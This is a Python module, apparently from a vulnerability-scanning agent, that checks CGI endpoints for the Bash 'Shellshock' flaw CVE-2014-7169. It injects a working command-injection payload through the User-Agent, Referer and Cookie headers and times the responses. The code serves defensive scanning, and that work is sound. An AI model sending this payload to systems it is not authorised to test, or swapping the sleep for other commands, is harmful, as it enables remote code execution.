"""Agent Asteroid implementation for CVE-2014-7169"""

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "GNU Bourne-Again Shell (Bash) Arbitrary Code Execution Vulnerability"
)
VULNERABILITY_REFERENCE = "CVE-2014-7169"
VULNERABILITY_DESCRIPTION = (
    "GNU Bash through 4.3 bash43-025 processes trailing strings after certain malformed function "
    "definitions in the values of environment variables, which allows remote attackers to write to "
    "files or possibly have unknown other impact via a crafted environment, as demonstrated by vectors "
    "involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache "
    "HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting "
    "the environment occurs across a privilege boundary from Bash execution. "
    "NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-6271."
)

DEFAULT_TIMEOUT = 90
PAYLOAD_TEMPLATE = "() { :;}; /bin/bash -c 'sleep %s'"
MAX_DELAY_DIFFERENCE = 5
DELAYS = [30, 40, 50, 60]
MAX_REDIRECTS = 2


@exploits_registry.register
class CVE20147169Exploit(definitions.Exploit):
    """CVE-2014-7169: GNU Bourne-Again Shell (Bash) Arbitrary Code Execution Vulnerability."""

    def accept(self, target: definitions.Target) -> bool:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        if target.path.endswith(".cgi") is False:
            return False
        try:
            resp = session.get(target.url, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return resp.status_code == 200

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        for delay in DELAYS:
            payload = PAYLOAD_TEMPLATE % delay
            try:
                resp = session.get(
                    target.url,
                    headers={
                        "User-Agent": payload,
                        "Referer": payload,
                        "Cookie": payload,
                    },
                )
            except requests_exceptions.RequestException:
                return []
            elapsed = resp.elapsed.seconds
            if elapsed < delay or elapsed - delay > MAX_DELAY_DIFFERENCE:
                return []

        vulnerability = self._generate_vulnerability_object(target.url)
        return [vulnerability]

    def _generate_vulnerability_object(
        self, target_uri: str
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE},"
            f" {VULNERABILITY_TITLE}."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
